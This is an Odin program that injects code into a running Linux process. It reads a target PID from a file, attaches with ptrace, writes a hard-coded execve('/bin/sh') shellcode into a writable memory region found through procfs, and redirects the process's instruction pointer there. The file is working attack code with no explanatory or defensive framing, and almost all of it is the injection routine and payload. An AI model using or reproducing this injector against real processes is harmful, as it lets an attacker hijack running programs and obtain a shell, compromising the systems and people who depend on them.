package main

import "core:fmt"
import os "core:os/os2"
import "core:strconv"
import "core:strings"
import "core:sys/linux"

get_pid_from_file :: proc() -> linux.Pid {
	data, err := os.read_entire_file_from_path("pidfile", context.allocator)
	assert(err == nil)
	stringer := string(data)
	splitted := strings.split_after(stringer, ":")
	trimmed := strings.trim_left_space(splitted[1])
	pid_int, ok := strconv.parse_int(trimmed)
	assert(ok)
	return linux.Pid(pid_int)
}
SHELLCODE :: []byte {
	0x90,
	0x90,
	0x31,
	0xc0,
	0x48,
	0xbb,
	0xd1,
	0x9d,
	0x96,
	0x91,
	0xd0,
	0x8c,
	0x97,
	0xff,
	0x48,
	0xf7,
	0xdb,
	0x53,
	0x54,
	0x5f,
	0x99,
	0x52,
	0x57,
	0x54,
	0x5e,
	0xb0,
	0x3b,
	0x0f,
	0x05,
}
main :: proc() {
	pid := get_pid_from_file()
	fmt.println(pid)


	if errno := linux.ptrace(linux.PTRACE_ATTACH, pid); errno != .NONE {
		fmt.println(errno, " problem with attach")
		return
	}
	status: u32
	usage: linux.RUsage
	if _, errno := linux.waitpid(pid, &status, {.WSTOPPED}, &usage); errno != .NONE {
		fmt.println(errno, " problem with waitpid")
		return
	}

	old_reqs: linux.User_Regs
	if errno := linux.ptrace(linux.PTRACE_GETREGS, pid, &old_reqs); errno != .NONE {
		fmt.println(errno, " problem with get regs")
		return
	}
	rw_address := procfs_find_memory_region(pid, "rw")
	assert(rw_address > 0)
	fmt.println(rw_address)
	ok := procfs_proc_mem_write(rw_address, pid, SHELLCODE)
	assert(ok)
	fmt.println("old reqs: ", old_reqs, "\n")

	newReqs := old_reqs
	newReqs.rip = uint(rw_address)
	if errno := linux.ptrace(linux.PTRACE_SETREGS, pid, &newReqs); errno != .NONE {
		fmt.println(errno, " problem with setting new regs")
		return
	}

	if errno := linux.ptrace(linux.PTRACE_DETACH, pid, linux.Signal(0)); errno != .NONE {
		fmt.println(errno, " problem with detach")
		return
	}
	fmt.println("done!")
}
